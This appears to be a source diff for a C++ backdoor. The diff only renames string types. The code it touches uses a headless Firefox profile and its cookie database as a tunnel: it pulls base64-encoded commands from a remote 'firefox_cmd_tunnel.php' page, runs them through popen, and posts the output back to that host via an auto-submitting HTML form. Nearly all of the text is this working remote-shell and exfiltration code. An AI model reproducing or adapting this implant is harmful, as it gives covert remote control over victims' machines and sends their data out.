@@ -9,16 +9,16 @@ read docs
 #include "utils.h"
 using namespace std;
 
- std::string domain;
+ string domain;
  
 static inline bool is_base64(unsigned char z) 
 {
 	return (isalnum(z) || (z == '+') || (z == '/'));
 }
 
-std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) 
+string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) 
 {
-	std::string ret;
+	string ret;
 	int i = 0, j = 0;
 	unsigned char array1[3], array2[4];
 
@@ -60,11 +60,11 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
 
 }
 
-std::string base64_decode(std::string const& encoded_string) 
+string base64_decode(string const& encoded_string) 
 {
 	int in_len = encoded_string.size(),i = 0,j = 0,in_ = 0;
 	unsigned char array1[3], array2[4];
-	std::string ret;
+	string ret;
 
 	while(in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) 
 	{
@@ -103,9 +103,9 @@ std::string base64_decode(std::string const& encoded_string)
 	return ret;
 }			 
 
-std::string readfile(const std::string &filepath)
+string readfile(const string &filepath)
 {
-	std::string buffer;
+	string buffer;
 	std::ifstream fin(filepath.c_str());
 	getline(fin, buffer, char(-1));
 	fin.close();
@@ -113,10 +113,10 @@ std::string readfile(const std::string &filepath)
 	return buffer;
 } 
  
-std::string exec_command(std::string cmd) 
+string exec_command(string cmd) 
 {
 	std::array<char, 128> buffer;
-    	std::string result;
+    	string result;
     	std::shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
 
     	if(!pipe) throw std::runtime_error("popen() failed!");
@@ -130,7 +130,7 @@ std::string exec_command(std::string cmd)
     	return result;
 }
  
-std::string get_unix_username()
+string get_unix_username()
 {
 	struct passwd *pw;
 	uid_t uid;
@@ -139,12 +139,12 @@ std::string get_unix_username()
         uid = geteuid();
         pw = getpwuid(uid);
         if(pw)
-                return std::string(pw->pw_name);
+                return string(pw->pw_name);
           
-        return std::string("");
+        return string("");
 } 
  
-std::string get_default_firefox_profiledir(const std::string& name)
+string get_default_firefox_profiledir(const string& name)
 {
 	DIR *dir = opendir(name.c_str()); 
 
@@ -154,7 +154,7 @@ std::string get_default_firefox_profiledir(const std::string& name)
 
         	while((ent = readdir(dir)) != NULL) 
         	{  
-			std::string test=ent->d_name;
+			string test=ent->d_name;
  
                 	if(test.find("presto4")!=string::npos)                                 
 				return test;
@@ -169,12 +169,12 @@ std::string get_default_firefox_profiledir(const std::string& name)
     
 }
 
-std::string get_firefox_sqlite_path()
+string get_firefox_sqlite_path()
 {
-	std::string user=get_unix_username();
-	std::string path="/home/"+user+"/.mozilla/firefox/";
-	std::string database_dir=get_default_firefox_profiledir(path);
-	std::string database_path;
+	string user=get_unix_username();
+	string path="/home/"+user+"/.mozilla/firefox/";
+	string database_dir=get_default_firefox_profiledir(path);
+	string database_path;
     	database_path=path+database_dir+"/cookies.sqlite";	
 
 	return database_path;
@@ -183,14 +183,14 @@ std::string get_firefox_sqlite_path()
 // write  cmd command in coookie
 void write_cmd_cookie()
 {
-	std::string str1="http://", str2="/firefox_shell/firefox_cmd_tunnel.php";
-	std::string path=str1+domain+str2;
-	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless -url "+path;
+	string str1="http://", str2="/firefox_shell/firefox_cmd_tunnel.php";
+	string path=str1+domain+str2;
+	string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless -url "+path;
 	cout << firefox_params+"\n" << endl;
 	std::system(firefox_params.c_str());	
 }
 
-void Write_File(std::string filename, std::string buf) 
+void Write_File(string filename, string buf) 
 {
 	ofstream myfile;
   	myfile.open (filename);
@@ -198,10 +198,10 @@ void Write_File(std::string filename, std::string buf)
   	myfile.close();
 }
 
-void construct_html(std::string result_cmd,  std::string filename)
+void construct_html(string result_cmd,  string filename)
 {
-	std::string content_html;
-	std::string result_base64=base64_encode(reinterpret_cast<const unsigned char*>(result_cmd.c_str()),result_cmd.length() );
+	string content_html;
+	string result_base64=base64_encode(reinterpret_cast<const unsigned char*>(result_cmd.c_str()),result_cmd.length() );
 	content_html="<html><form enctype=\"application/x-www-form-urlencoded\" id=\"autopost\" method=\"POST\" action=\"http://"+domain+"/firefox_shell/firefox_cmd_tunnel.php\">";
 	content_html+="<table><tr><td>result</td><td><input type=\"text\" value=\""+result_base64+"\" name=\"result\">";
 	content_html+="</td></tr></table><input type=\"submit\"></form>";
@@ -209,9 +209,9 @@ void construct_html(std::string result_cmd,  std::string filename)
 	Write_File(filename,content_html);
 }
 
-void send_result_cmd(std::string html_file)
+void send_result_cmd(string html_file)
 {
-	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless "+html_file;	
+	string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless "+html_file;	
 	cout << firefox_params+"\n" << endl;
 	std::system(firefox_params.c_str());
 //todo add error test...	
@@ -226,8 +226,8 @@ static int callback(void *data, int argc, char **argv, char **azColName)
    	{
 		if(i==4) 
 	  	{
-			std::string command=base64_decode(argv[i]);
-			std::string  result_cmd=exec_command(command);
+			string command=base64_decode(argv[i]);
+			string  result_cmd=exec_command(command);
 			construct_html(result_cmd,  "output.html");
 			send_result_cmd("output.html");
 	  	}
@@ -239,10 +239,10 @@ static int callback(void *data, int argc, char **argv, char **azColName)
 
 void start_cookie_tunnel()
 {
-	std::string cmd;
+	string cmd;
 	// at the future if remote_server turn in user input, todo is sanitize this item to do SQL injection mitigation
-	std::string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
-	std::string tmp = get_firefox_sqlite_path();
+	string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
+	string tmp = get_firefox_sqlite_path();
 	sqlite3 *db;
     	char *zErrMsg = 0;
     	int rc;
